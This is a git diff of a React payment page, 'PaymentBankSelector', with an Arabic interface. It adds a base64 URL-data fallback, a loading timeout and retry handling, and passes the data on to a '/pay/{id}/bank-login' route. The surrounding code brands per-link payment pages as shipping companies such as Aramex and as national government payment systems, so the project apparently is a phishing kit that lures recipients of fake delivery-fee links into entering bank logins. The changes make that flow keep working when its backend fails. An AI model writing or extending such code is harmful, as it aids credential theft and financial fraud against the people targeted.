@@ -1,9 +1,9 @@
-import { useState, useEffect } from "react";
-import { useParams, useNavigate } from "react-router-dom";
+import { useState, useEffect, useRef } from "react";
+import { useParams, useNavigate, useSearchParams } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { Building2, Loader2, CheckCircle2, Sparkles, ShieldCheck, Lock } from "lucide-react";
+import { Building2, Loader2, CheckCircle2, Sparkles, ShieldCheck, Lock, AlertCircle, RefreshCw } from "lucide-react";
 import { designSystem } from "@/lib/designSystem";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
@@ -18,27 +18,64 @@ const PaymentBankSelector = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData, isLoading: linkLoading } = useLink(id);
+  const [searchParams] = useSearchParams();
+  const { data: linkData, isLoading: linkLoading, error: linkError, refetch } = useLink(id);
   const updateLink = useUpdateLink();
 
   const [selectedBank, setSelectedBank] = useState<string>("");
   const [banks, setBanks] = useState<Bank[]>([]);
   const [loadingBanks, setLoadingBanks] = useState(false);
+  const [loadingTimeout, setLoadingTimeout] = useState(false);
+  const [retryCount, setRetryCount] = useState(0);
+  const timeoutRef = useRef<NodeJS.Timeout>();
   
-  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
+  const fallbackData = useRef<any>(null);
+  
+  useEffect(() => {
+    const dataParam = searchParams.get('data');
+    if (dataParam) {
+      try {
+        fallbackData.current = JSON.parse(decodeURIComponent(atob(dataParam)));
+      } catch (e) {
+        console.error('Failed to parse URL data:', e);
+      }
+    }
+  }, [searchParams]);
+
+  useEffect(() => {
+    if (linkLoading) {
+      timeoutRef.current = setTimeout(() => {
+        setLoadingTimeout(true);
+      }, 8000);
+    } else {
+      if (timeoutRef.current) {
+        clearTimeout(timeoutRef.current);
+      }
+      setLoadingTimeout(false);
+    }
+    
+    return () => {
+      if (timeoutRef.current) {
+        clearTimeout(timeoutRef.current);
+      }
+    };
+  }, [linkLoading]);
+
+  const effectiveData = linkData || fallbackData.current;
+  const countryCode = effectiveData?.payload?.selectedCountry || effectiveData?.country_code || "SA";
   const countryData = getCountryByCode(countryCode);
   
   const govSystem = getGovernmentPaymentSystem(countryCode);
   
-  const preselectedBank = linkData?.payload?.selected_bank;
+  const preselectedBank = effectiveData?.payload?.selected_bank;
   
-  const customerInfo = linkData?.payload?.customerInfo || {};
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
+  const customerInfo = effectiveData?.payload?.customerInfo || {};
+  const serviceKey = effectiveData?.payload?.service_key || customerInfo.service || 'aramex';
+  const serviceName = effectiveData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
   
-  const shippingInfo = linkData?.payload as any;
+  const shippingInfo = effectiveData?.payload as any;
   const paymentData = shippingInfo?.payment_data;
 
   const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;
@@ -76,28 +113,39 @@ const PaymentBankSelector = () => {
   const handleBankSelect = async (bankId: string) => {
     setSelectedBank(bankId);
     
-    if (!linkData) return;
+    if (!effectiveData) return;
 
     try {
       const updatedPayload = {
-        ...linkData.payload,
+        ...effectiveData.payload,
         selectedCountry: countryCode,
         selectedBank: bankId,
       };
 
-      await updateLink.mutateAsync({
-        linkId: id!,
-        payload: updatedPayload
-      });
+      if (linkData) {
+        await updateLink.mutateAsync({
+          linkId: id!,
+          payload: updatedPayload
+        });
+      }
     } catch (error) {
+      console.error('Error updating link:', error);
     }
 
     setTimeout(() => {
-      navigate(`/pay/${id}/bank-login`);
+      const dataParam = searchParams.get('data');
+      const urlSuffix = dataParam ? `?data=${dataParam}` : '';
+      navigate(`/pay/${id}/bank-login${urlSuffix}`);
     }, 400);
   };
   
-  if (linkLoading || !linkData) {
+  const handleRetry = () => {
+    setRetryCount(prev => prev + 1);
+    setLoadingTimeout(false);
+    refetch();
+  };
+  
+  if ((linkLoading || !effectiveData) && !loadingTimeout) {
     return (
       <div 
         className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
@@ -109,6 +157,56 @@ const PaymentBankSelector = () => {
         <div className="text-center">
           <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
           <p style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>جاري تحميل البيانات...</p>
+        </div>
+      </div>
+    );
+  }
+  
+  if ((loadingTimeout && !effectiveData) || linkError) {
+    return (
+      <div 
+        className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
+        dir="rtl"
+        style={{
+          background: govSystem.colors.surface
+        }}
+      >
+        <div className="text-center max-w-md mx-auto px-4">
+          <div 
+            className="w-20 h-20 rounded-full mx-auto mb-6 flex items-center justify-center"
+            style={{ backgroundColor: `${govSystem.colors.primary}20` }}
+          >
+            <AlertCircle className="w-10 h-10" style={{ color: govSystem.colors.primary }} />
+          </div>
+          <h2 className="text-2xl font-bold mb-3" style={{ color: govSystem.colors.text }}>خطأ في تحميل البيانات</h2>
+          <p className="text-base mb-6" style={{ color: govSystem.colors.textLight }}>
+            {linkError ? 'حدث خطأ أثناء تحميل بيانات الدفع' : 'انتهت مهلة تحميل البيانات'}
+          </p>
+          <div className="flex flex-col gap-3">
+            <Button 
+              onClick={handleRetry}
+              className="w-full"
+              style={{
+                backgroundColor: govSystem.colors.primary,
+                color: '#ffffff'
+              }}
+            >
+              <RefreshCw className="w-4 h-4 ml-2" />
+              إعادة المحاولة
+            </Button>
+            <Button 
+              onClick={() => navigate('/services')}
+              variant="outline"
+              className="w-full"
+            >
+              العودة للخدمات
+            </Button>
+          </div>
+          {retryCount > 0 && (
+            <p className="text-xs mt-4" style={{ color: govSystem.colors.textLight }}>
+              عدد المحاولات: {retryCount}
+            </p>
+          )}
         </div>
       </div>
     );
